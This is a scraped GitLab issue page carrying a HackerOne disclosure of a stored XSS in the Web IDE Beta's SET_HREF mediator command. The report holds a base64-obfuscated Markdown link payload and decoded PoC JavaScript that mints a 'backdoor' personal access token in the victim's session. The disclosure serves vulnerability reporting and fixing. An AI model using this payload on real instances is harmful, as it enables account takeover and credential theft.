data-wi-labels-fetch-path="/groups/gitlab/-/labels.json?include_ancestor_groups=true&amp;only_group_labels=true" data-wi-labels-manage-path="/gitlab-org/gitlab/-/labels" data-wi-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-wi-new-project-path="/projects/new?namespace_id=9970" data-wi-register-path="/users/sign_up?redirect_to_referer=yes" data-wi-report-abuse-path="/-/abuse_reports/add_category" data-wi-show-new-issue-link="false" data-wi-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>


<div class="js-related-issues-root" data-can-add-related-issues="false" data-endpoint="/gitlab-org/gitlab/-/issues/407783/links" data-full-path="gitlab-org/gitlab" data-has-issue-weights-feature="true" data-has-iterations-feature="true" data-help-path="/help/user/project/issues/related_issues.md" data-is-group="false" data-issuable-type="issue" data-show-categorized-issues="true" data-wi-autocomplete-award-emojis-path="/-/autocomplete/award_emojis" data-wi-can-admin-label="false" data-wi-can-bulk-edit-epics="false" data-wi-can-create-projects="false" data-wi-default-branch="master" data-wi-epics-list-path="/groups/gitlab/-/epics" data-wi-full-path="gitlab-org/gitlab" data-wi-group-id="9970" data-wi-group-issues-path="/groups/gitlab/-/issues" data-wi-group-path="gitlab-org" data-wi-has-epics-feature="true" data-wi-has-issuable-health-status-feature="true" data-wi-has-issue-weights-feature="true" data-wi-has-iterations-feature="true" data-wi-has-linked-items-epics-feature="true" data-wi-has-okrs-feature="true" data-wi-has-quality-management-feature="true" data-wi-has-scoped-labels-feature="true" data-wi-has-subepics-feature="true" data-wi-is-signed-in="false" data-wi-issues-list-path="/gitlab-org/gitlab/-/issues" data-wi-labels-fetch-path="/groups/gitlab/-/labels.json?include_ancestor_groups=true&amp;only_group_labels=true" data-wi-labels-manage-path="/gitlab-org/gitlab/-/labels" data-wi-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-wi-new-project-path="/projects/new?namespace_id=9970" data-wi-register-path="/users/sign_up?redirect_to_referer=yes" data-wi-report-abuse-path="/-/abuse_reports/add_category" data-wi-show-new-issue-link="false" data-wi-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>

<div data-has-closing-merge-request="false" data-iid="407783" data-project-path="gitlab-org/gitlab" id="js-related-merge-requests"></div>
<div data-url="/gitlab-org/gitlab/-/issues/407783/related_branches" id="related-branches">
</div>
</div>
<div class="js-issue-widgets">
<section class="issuable-discussion js-vue-notes-event">
<div data-can-add-timeline-events="false" data-current-user-data="null" data-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-noteable-data="{&quot;id&quot;:126893846,&quot;iid&quot;:407783,&quot;description&quot;:&quot;:warning: **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**\n\n**[HackerOne report #1940598](https://hackerone.com/reports/1940598)** by `viridian_40826d` on 2023-04-10, assigned to @greg:\n\n[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)\n\n## Report\n\n####  Summary\n\nSince [v15.7](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/95169), GitLab ships with a new [Web IDE](https://docs.gitlab.com/ee/user/project/web_ide_beta/index.html) powered by the [Monaco](https://github.com/microsoft/monaco-editor) editor.\n\nThe Web IDE is [architected](https://gitlab.com/gitlab-org/gitlab-web-ide/-/blob/77e6cd26c9f6b2694290b9800f9cc0c2b328e1bd/docs/dev/architecture_packages.md) such that certain interactions take place outside of the sandboxed Monaco runtime environment. These interactions are handled by the `vscode-mediator-commands` package:\n\n\u003e The vscode-mediator-commands package creates a set of commands that can be **triggered** from the VSCode Extension runtime environment but are **executed** in the Iframe runtime environment. This means that web requests naturally use the Main cookie and the command can have full access to the provided configuration.\n\nOne such mediator command is `SET_HREF`, which [constructs](https://gitlab.com/gitlab-org/gitlab-web-ide/-/blob/42428717ac4793969ad83c8feaa67440b36b1a96/packages/vscode-mediator-commands/src/commands/index.ts#L115-120) a URL object by concatenating the value of `window.parent.location.href` with the `href` string attribute:\n\n```javascript  \nconst parentHref = window.parent.location.href;  \nconst newUrl = new URL(href, parentHref);  \nwindow.parent.location.href = newUrl.href;  \n```\n\nBy default, the UI calls the `SET_HREF` command referencing an enum of trusted links to the preferences and feedback pages so that these can be opened in a new tab, outside of the sandbox:\n\n![GitLab_WebIDE_Mediator.png](https://h1.sec.gitlab.net/a/b090b6f5-ca4e-4101-8009-cf9f0b9cf15c/GitLab_WebIDE_Mediator.png)\n\nHowever,  the `href` attribute can become user-controlled when a mediator command URL is formed in Markdown. We can then clobber the `parentHref` by introducing our own URL in `href` with an explicitly defined scheme, like so:\n\n```markdown  \n\u003c!-- Opens the result of: new URL(\&quot;javascript:confirm(document.domain)\&quot;, \&quot;https://gitlab\&quot;) --\u003e  \n[Execute command](command:gitlab-web-ide.mediator.set-href?[\&quot;javascript:confirm%28document.domain%29\&quot;])  \n```\n\nWhile the subframe used to _preview_ Markdown is itself sandboxed, the editor frame and its interactions with the mediator are not. Since the Web IDE supports Monaco&#39;s \&quot;follow link\&quot; behaviour, an attacker can execute arbitrary JavaScript in a victim&#39;s GitLab session when they Ctrl/Cmd-click a crafted link in a Markdown file:\n\n![GitLab_WebIDE_XSS.png](https://h1.sec.gitlab.net/a/dbb6230e-4d9b-4530-8e7a-6c95c07ccf4a/GitLab_WebIDE_XSS.png)\n\n####  Environment\n\nSelf-managed GitLab CE and EE instances where a strict CSP is not enforced are affected by this vulnerability.\n\n`gitlab-rake gitlab:env:info` output:\n\n```bash  \nSystem information  \nSystem:     Ubuntu 20.04  \nProxy:      no  \nCurrent User:   git  \nUsing RVM:  no  \nRuby Version:   3.0.5p211  \nGem Version:    3.2.33  \nBundler Version:2.3.15  \nRake Version:   13.0.6  \nRedis Version:  6.2.11  \nSidekiq Version:6.5.7\n\nGitLab information  \nVersion:    15.10.2-ee  \nRevision:   a54d6973eae  \nDirectory:  /opt/gitlab/embedded/service/gitlab-rails  \nDB Adapter: PostgreSQL  \nDB Version: 13.8  \nElasticsearch:  no  \nGeo:        no  \nUsing LDAP: no  \nUsing Omniauth: yes  \nOmniauth Providers:\n\nGitLab Shell  \nVersion:    14.18.0  \nRepository storages:  \n- default:  unix:/var/opt/gitlab/gitaly/gitaly.socket  \nGitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell  \n```\n\n####  Steps to Reproduce\n\n1. Bring up an instance of GitLab EE (herein `https://gitlab`) following the [installation instructions](https://about.gitlab.com/install/#ubuntu).\n\n2. Enable the `vscode_web_ide` [feature flag](https://docs.gitlab.com/ee/administration/feature_flags.html) by running `gitlab-rails console` followed by `Feature.enable(:vscode_web_ide)` once inside the IRB shell. (**Please note**: per the [documentation](https://docs.gitlab.com/ee/user/project/web_ide_beta/index.html), the new Web IDE will be enabled by default in v15.11 which releases in 12 days&#39; time and so enabling this feature flag will soon no longer be required).\n\n3. Create a new project from [https://gitlab/projects/new#blank_project](https://gitlab/projects/new#blank_project) and commit a README.md file containing the following proof of concept link, whose decoded JavaScript is included at the end of this section under \&quot;PoC Code\&quot;:\n\n    ```markdown  \n    [Execute command](command:gitlab-web-ide.mediator.set-href?[\&quot;javascript:eval%28atob%28&#39;dmFyIHRvayxwPW5ldyBET01QYXJzZXIsbz13aW5kb3cubG9jYXRpb24ub3JpZ2luO2ZldGNoKG8rIi8tL3Byb2ZpbGUvcGVyc29uYWxfYWNjZXNzX3Rva2VucyIpLnRoZW4oKGZ1bmN0aW9uKGUpe3JldHVybiBlLm9rP2UudGV4dCgpOlByb21pc2UucmVqZWN0KGUpfSkpLnRoZW4oKGZ1bmN0aW9uKGUpe3JldHVybiB0b2s9cC5wYXJzZUZyb21TdHJpbmcoZSwidGV4dC9odG1sIikuZ2V0RWxlbWVudHNCeU5hbWUoImNzcmYtdG9rZW4iKVswXS5jb250ZW50LGZldGNoKG8rIi8tL3Byb2ZpbGUvcGVyc29uYWxfYWNjZXNzX3Rva2VucyIse2NyZWRlbnRpYWxzOiJpbmNsdWRlIixoZWFkZXJzOnsiQ29udGVudC1UeXBlIjoiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIixtZXRob2Q6IlBPU1QifSxib2R5OmBhdXRoZW50aWNpdHlfdG9rZW49JHtlbmNvZGVVUklDb21wb25lbnQodG9rKX0mcGVyc29uYWxfYWNjZXNzX3Rva2VuW25hbWVdPWJhY2tkb29yJnBlcnNvbmFsX2FjY2Vzc190b2tlbltleHBpcmVzX2F0XT0mcGVyc29uYWxfYWNjZXNzX3Rva2VuW3Njb3Blc11bXT1hcGlgLG1ldGhvZDoiUE9TVCIsbW9kZToiY29ycyJ9KX0pKS50aGVuKChmdW5jdGlvbihlKXtyZXR1cm4gZS5vaz9lLmpzb24oKTpQcm9taXNlLnJlamVjdChlKX0pKS50aGVuKChmdW5jdGlvbihlKXthbGVydChgQ3JlYXRlZCBwZXJzb25hbCBhY2Nlc3MgdG9rZW46ICR7ZS5uZXdfdG9rZW59YCl9KSk7&#39;%29%29\&quot;])  \n    ```\n\n4. Open the README.md file in the Web IDE (https://gitlab/-/ide/project/demo/edit/main/-/README.md) and Ctrl/Cmd-click on the \&quot;Execute command\&quot; link.\n\n5. Observe the JavaScript alert dialog containing a newly minted personal access token for the logged-in user.\n\n#####  PoC Code\n\n```javascript  \nvar tok,p=new DOMParser,o=window.location.origin;fetch(o+\&quot;/-/profile/personal_access_tokens\&quot;).then((function(e){return e.ok?e.text():Promise.reject(e)})).then((function(e){return tok=p.parseFromString(e,\&quot;text/html\&quot;).getElementsByName(\&quot;csrf-token\&quot;)[0].content,fetch(o+\&quot;/-/profile/personal_access_tokens\&quot;,{credentials:\&quot;include\&quot;,headers:{\&quot;Content-Type\&quot;:\&quot;application/x-www-form-urlencoded\&quot;,method:\&quot;POST\&quot;},body:`authenticity_token=${encodeURIComponent(tok)}\u0026personal_access_token[name]=backdoor\u0026personal_access_token[expires_at]=\u0026personal_access_token[scopes][]=api`,method:\&quot;POST\&quot;,mode:\&quot;cors\&quot;})})).then((function(e){return e.ok?e.json():Promise.reject(e)})).then((function(e){alert(`Created personal access token: ${e.new_token}`)}));  \n```\n\n####  Impact\n\nAn attacker who convinces a victim to interact with a Markdown link in the new Web IDE can execute JavaScript in that victim&#39;s GitLab session allowing them to perform unwanted actions on their behalf and take over their account.\n\n## Attachments\n\n**Warning:** Attachments received through HackerOne, please exercise caution!\n\n* [GitLab_WebIDE_XSS.png](https://h1.sec.gitlab.net/a/dbb6230e-4d9b-4530-8e7a-6c95c07ccf4a/GitLab_WebIDE_XSS.png)\n* [GitLab_WebIDE_Mediator.png](https://h1.sec.gitlab.net/a/b090b6f5-ca4e-4101-8009-cf9f0b9cf15c/GitLab_WebIDE_Mediator.png)\n\n## How To Reproduce\n\nPlease add [reproducibility information] to this section:\n\n1.\n1.\n1.\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues&quot;,&quot;title&quot;:&quot;Stored XSS in Web IDE Beta via crafted URL executing SET_HREF mediator command with user-controlled href attribute&quot;,&quot;time_estimate&quot;:0,&quot;total_time_spent&quot;:0,&quot;human_time_estimate&quot;:null,&quot;human_total_time_spent&quot;:null,&quot;state&quot;:&quot;closed&quot;,&quot;milestone_id&quot;:2969672,&quot;updated_by_id&quot;:10334294,&quot;created_at&quot;:&quot;2023-04-18T17:13:51Z&quot;,&quot;updated_at&quot;:&quot;2023-10-17T10:37:29Z&quot;,&quot;milestone&quot;:{&quot;id&quot;:2969672,&quot;iid&quot;:89,&quot;group_id&quot;:9970,&quot;title&quot;:&quot;16.2&quot;,&quot;description&quot;:&quot;&quot;,&quot;state&quot;:&quot;closed&quot;,&quot;created_at&quot;:&quot;2023-02-01T16:03:02.095Z&quot;,&quot;updated_at&quot;:&quot;2024-02-12T11:13:27.741Z&quot;,&quot;due_date&quot;:&quot;2023-07-17&quot;,&quot;start_date&quot;:&quot;2023-06-18&quot;,&quot;expired&quot;:true,&quot;web_url&quot;:&quot;https://gitlab.com/groups/gitlab-org/-/milestones/89&quot;},&quot;labels&quot;:[{&quot;id&quot;:3094749,&quot;title&quot;:&quot;Category:Web IDE&quot;,&quot;color&quot;:&quot;#428BCA&quot;,&quot;description&quot;:&quot;Issues related to the Web IDE project: https://gitlab.com/gitlab-org/gitlab-ee/issues/3946&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-11-29T23:54:42.981Z&quot;,&quot;updated_at&quot;:&quot;2019-10-30T13:53:52.375Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:992791,&quot;title&quot;:&quot;Deliverable&quot;,&quot;color&quot;:&quot;#428BCA&quot;,&quot;description&quot;:&quot;Issues scheduled for the current milestone.&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2016-11-18T17:02:50.145Z&quot;,&quot;updated_at&quot;:&quot;2019-04-17T18:49:16.998Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3417347,&quot;title&quot;:&quot;HackerOne&quot;,&quot;color&quot;:&quot;#0033CC&quot;,&quot;description&quot;:&quot;&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-01-31T13:53:42.609Z&quot;,&quot;updated_at&quot;:&quot;2019-01-09T12:13:21.325Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:17009645,&quot;title&quot;:&quot;Weakness::CWE-79&quot;,&quot;color&quot;:&quot;#7F8C8D&quot;,&quot;description&quot;:&quot;Cross-site Scripting (XSS) - Stored&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2020-11-10T07:06:20.195Z&quot;,&quot;updated_at&quot;:&quot;2020-11-10T07:06:20.195Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2492649,&quot;title&quot;:&quot;backend&quot;,&quot;color&quot;:&quot;#D10069&quot;,&quot;description&quot;:&quot;Issues that require backend work&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-08-15T14:49:42.004Z&quot;,&quot;updated_at&quot;:&quot;2018-06-11T10:34:33.030Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:4107753,&quot;title&quot;:&quot;bug::vulnerability&quot;,&quot;color&quot;:&quot;#CC0000&quot;,&quot;description&quot;:&quot;A security vulnerability&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-05-22T15:15:09.960Z&quot;,&quot;updated_at&quot;:&quot;2022-03-16T11:32:16.336Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3103452,&quot;title&quot;:&quot;devops::create&quot;,&quot;color&quot;:&quot;#E44D2A&quot;,&quot;description&quot;:&quot;Issues for the Create stage of the DevOps lifecycle (e.g. Source Code Management, Design Management, Web IDE, Code Review, Gitter)&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-12-01T19:01:03.585Z&quot;,&quot;updated_at&quot;:&quot;2022-07-04T07:09:55.759Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3412464,&quot;title&quot;:&quot;frontend&quot;,&quot;color&quot;:&quot;#3cb371&quot;,&quot;description&quot;:&quot;Issues for the Frontend team. Covers everything related to the way GitLab behaves (and, to an extent, looks) inside your browser.&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-01-30T21:42:37.900Z&quot;,&quot;updated_at&quot;:&quot;2022-05-13T09:23:38.237Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:29990077,&quot;title&quot;:&quot;group::remote development&quot;,&quot;color&quot;:&quot;#a8d695&quot;,&quot;description&quot;:&quot;Items related to the Remote Development group&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2023-04-19T18:09:26.707Z&quot;,&quot;updated_at&quot;:&quot;2024-07-16T10:09:03.108Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3857529,&quot;title&quot;:&quot;priority::3&quot;,&quot;color&quot;:&quot;#fff600&quot;,&quot;description&quot;:&quot;We want to address this but may have other higher priority items. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#priority&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2018-04-13T08:02:52.659Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:23:53.318Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:14918378,&quot;title&quot;:&quot;section::dev&quot;,&quot;color&quot;:&quot;#F0AD4E&quot;,&quot;description&quot;:&quot;Issues related to the Dev section&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2020-05-11T22:11:57.167Z&quot;,&quot;updated_at&quot;:&quot;2020-05-11T22:11:57.167Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2779335,&quot;title&quot;:&quot;security&quot;,&quot;color&quot;:&quot;#d9534f&quot;,&quot;description&quot;:&quot;Issues related to the security of GitLab or its dependencies. Please report vulnerabilities responsibly per https://about.gitlab.com/security/disclosure/&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-10-05T14:36:39.341Z&quot;,&quot;updated_at&quot;:&quot;2023-05-24T20:20:05.269Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3713901,&quot;title&quot;:&quot;severity::3&quot;,&quot;color&quot;:&quot;#fff600&quot;,&quot;description&quot;:&quot;Major - applies to bugs and bug categories of availability, performance, security and ux. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#severity&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2018-03-23T14:46:22.464Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:12:27.359Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2278648,&quot;title&quot;:&quot;type::bug&quot;,&quot;color&quot;:&quot;#cc0000&quot;,&quot;description&quot;:&quot;Issues that report undesirable or incorrect behavior. See https://handbook.gitlab.com/handbook/product/groups/product-analysis/engineering/metrics/#work-type-classification&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-07-07T20:20:34.868Z&quot;,&quot;updated_at&quot;:&quot;2024-11-08T09:52:16.699Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:28669354,&quot;title&quot;:&quot;workflow::complete&quot;,&quot;color&quot;:&quot;#428BCA&quot;,&quot;description&quot;:&quot;Applied after all MRs have merged and the issue has been verified if necessary&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2023-01-12T00:18:59.592Z&quot;,&quot;updated_at&quot;:&quot;2023-01-12T17:27:43.939Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false}],&quot;lock_version&quot;:1,&quot;author_id&quot;:2741139,&quot;confidential&quot;:false,&quot;discussion_locked&quot;:null,&quot;assignees&quot;:[{&quot;id&quot;:2233420,&quot;username&quot;:&quot;pslaughter&quot;,&quot;name&quot;:&quot;Paul Slaughter&quot;,&quot;state&quot;:&quot;active&quot;,&quot;locked&quot;:false,&quot;avatar_url&quot;:&quot;https://gitlab.com/uploads/-/system/user/avatar/2233420/avatar.png&quot;,&quot;web_url&quot;:&quot;https://gitlab.com/pslaughter&quot;},{&quot;id&quot;:10334294,&quot;username&quot;:&quot;truegreg&quot;,&quot;name&quot;:&quot;Greg Alfaro&quot;,&quot;state&quot;:&quot;active&quot;,&quot;locked&quot;:false,&quot;avatar_url&quot;:&quot;https://gitlab.com/uploads/-/system/user/avatar/10334294/avatar.png&quot;,&quot;web_url&quot;:&quot;https://gitlab.com/truegreg&quot;}],&quot;due_date&quot;:&quot;2023-06-26&quot;,&quot;project_id&quot;:278964,&quot;moved_to_id&quot;:null,&quot;duplicated_to_id&quot;:null,&quot;web_url&quot;:&quot;/gitlab-org/gitlab/-/issues/407783&quot;,&quot;current_user&quot;:{&quot;can_create_note&quot;:false,&quot;can_create_confidential_note&quot;:false,&quot;can_update&quot;:false,&quot;can_set_issue_metadata&quot;:false,&quot;can_award_emoji&quot;:false},&quot;create_note_path&quot;:&quot;/gitlab-org/gitlab/notes?target_id=126893846\u0026target_type=issue&quot;,&quot;preview_note_path&quot;:&quot;/gitlab-org/gitlab/-/preview_markdown?target_id=407783\u0026target_type=Issue&quot;,&quot;is_project_archived&quot;:false,&quot;issue_email_participants&quot;:[],&quot;type&quot;:&quot;ISSUE&quot;,&quot;weight&quot;:null,&quot;blocked&quot;:false,&quot;blocked_by_issues&quot;:[]}" data-noteable-type="Issue" data-notes-data="{&quot;noteableType&quot;:&quot;issue&quot;,&quot;noteableId&quot;:126893846,&quot;projectId&quot;:278964,&quot;groupId&quot;:null,&quot;discussionsPath&quot;:&quot;/gitlab-org/gitlab/-/issues/407783/discussions.json&quot;,&quot;registerPath&quot;:&quot;/users/sign_up?redirect_to_referer=yes&quot;,&quot;newSessionPath&quot;:&quot;/users/sign_in?redirect_to_referer=yes&quot;,&quot;markdownDocsPath&quot;:&quot;/help/user/markdown.md&quot;,&quot;quickActionsDocsPath&quot;:&quot;/help/user/project/quick_actions.md&quot;,&quot;closePath&quot;:&quot;/gitlab-org/gitlab/-/issues/407783.json?issue%5Bstate_event%5D=close&quot;,&quot;reopenPath&quot;:&quot;/gitlab-org/gitlab/-/issues/407783.json?issue%5Bstate_event%5D=reopen&quot;,&quot;notesPath&quot;:&quot;/gitlab-org/gitlab/noteable/issue/126893846/notes&quot;,&quot;prerenderedNotesCount&quot;:10,&quot;lastFetchedAt&quot;:1736564038000000,&quot;notesFilter&quot;:null}" data-notes-filters="{&quot;Show all activity&quot;:0,&quot;Show comments only&quot;:1,&quot;Show history only&quot;:2}" data-report-abuse-path="/-/abuse_reports/add_category" data-show-timeline-view-toggle="false" data-target-type="issue" id="js-vue-notes"></div>
</section>

</div>
</div>
<aside aria-label="issue" aria-live="polite" class="right-sidebar js-right-sidebar js-issuable-sidebar right-sidebar-expanded" data-always-show-toggle data-auto-collapse data-issuable-type="issue">
<div class="issuable-sidebar">
<div class="issuable-sidebar-header">
<button class="gl-button btn btn-md btn-default gutter-toggle gl-float-right js-sidebar-toggle has-tooltip !gl-border-0" type="button" aria-label="Toggle sidebar" title="Collapse sidebar" data-container="body" data-placement="left" data-boundary="viewport" type="button"><span class="gl-button-text">
<span class="js-sidebar-toggle-container gl-button-text" data-is-expanded="true"><svg class="s16 js-sidebar-expand hidden" data-testid="chevron-double-lg-left-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#chevron-double-lg-left"></use></svg><svg class="s16 js-sidebar-collapse " data-testid="chevron-double-lg-right-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#chevron-double-lg-right"></use></svg></span>

</span>

</button></div>
<form class="issuable-context-form inline-update js-issuable-update " action="/gitlab-org/gitlab/-/issues/407783.json" accept-charset="UTF-8" data-remote="true" method="post"><div class="block assignee gl-mt-3" data-testid="assignee-block-container">
<div class="js-sidebar-assignees-root" data-field="issue" data-max-assignees="200">
<div class="title hide-collapsed gl-flex gl-justify-between gl-items-center !gl-mb-0">
<span class="gl-font-bold">Assignee</span>
<span class="gl-spinner-container" role="status"><span aria-hidden class="gl-spinner gl-spinner-sm gl-spinner-dark !gl-align-text-bottom"></span><span class="gl-sr-only !gl-absolute">Loading</span>
</span>
</div>
</div>

</div>
<div class="block epic" data-testid="sidebar-epic">
<div class="js-sidebar-epic-widget-root" data-can-edit="false" data-group-path="gitlab-org" data-issue-id="126893846" data-issue-iid="407783" data-project-path="gitlab-org/gitlab"></div>
</div>

<div class="js-sidebar-labels-widget-root" data-allow-label-create="" data-allow-scoped-labels="true" data-can-edit="" data-iid="407783" data-issuable-type="issue" data-labels-fetch-path="/gitlab-org/gitlab/-/labels.json?include_ancestor_groups=true" data-labels-manage-path="/gitlab-org/gitlab/-/labels" data-project-issues-path="/gitlab-org/gitlab/-/issues" data-project-path="gitlab-org/gitlab" data-selected-labels="[{&quot;id&quot;:3094749,&quot;title&quot;:&quot;Category:Web IDE&quot;,&quot;color&quot;:&quot;#428BCA&quot;,&quot;description&quot;:&quot;Issues related to the Web IDE project: https://gitlab.com/gitlab-org/gitlab-ee/issues/3946&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-11-29T23:54:42.981Z&quot;,&quot;updated_at&quot;:&quot;2019-10-30T13:53:52.375Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:992791,&quot;title&quot;:&quot;Deliverable&quot;,&quot;color&quot;:&quot;#428BCA&quot;,&quot;description&quot;:&quot;Issues scheduled for the current milestone.&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2016-11-18T17:02:50.145Z&quot;,&quot;updated_at&quot;:&quot;2019-04-17T18:49:16.998Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3417347,&quot;title&quot;:&quot;HackerOne&quot;,&quot;color&quot;:&quot;#0033CC&quot;,&quot;description&quot;:&quot;&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-01-31T13:53:42.609Z&quot;,&quot;updated_at&quot;:&quot;2019-01-09T12:13:21.325Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:17009645,&quot;title&quot;:&quot;Weakness::CWE-79&quot;,&quot;color&quot;:&quot;#7F8C8D&quot;,&quot;description&quot;:&quot;Cross-site Scripting (XSS) - Stored&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2020-11-10T07:06:20.195Z&quot;,&quot;updated_at&quot;:&quot;2020-11-10T07:06:20.195Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2492649,&quot;title&quot;:&quot;backend&quot;,&quot;color&quot;:&quot;#D10069&quot;,&quot;description&quot;:&quot;Issues that require backend work&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-08-15T14:49:42.004Z&quot;,&quot;updated_at&quot;:&quot;2018-06-11T10:34:33.030Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:4107753,&quot;title&quot;:&quot;bug::vulnerability&quot;,&quot;color&quot;:&quot;#CC0000&quot;,&quot;description&quot;:&quot;A security vulnerability&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-05-22T15:15:09.960Z&quot;,&quot;updated_at&quot;:&quot;2022-03-16T11:32:16.336Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3103452,&quot;title&quot;:&quot;devops::create&quot;,&quot;color&quot;:&quot;#E44D2A&quot;,&quot;description&quot;:&quot;Issues for the Create stage of the DevOps lifecycle (e.g. Source Code Management, Design Management, Web IDE, Code Review, Gitter)&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-12-01T19:01:03.585Z&quot;,&quot;updated_at&quot;:&quot;2022-07-04T07:09:55.759Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3412464,&quot;title&quot;:&quot;frontend&quot;,&quot;color&quot;:&quot;#3cb371&quot;,&quot;description&quot;:&quot;Issues for the Frontend team. Covers everything related to the way GitLab behaves (and, to an extent, looks) inside your browser.&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-01-30T21:42:37.900Z&quot;,&quot;updated_at&quot;:&quot;2022-05-13T09:23:38.237Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:29990077,&quot;title&quot;:&quot;group::remote development&quot;,&quot;color&quot;:&quot;#a8d695&quot;,&quot;description&quot;:&quot;Items related to the Remote Development 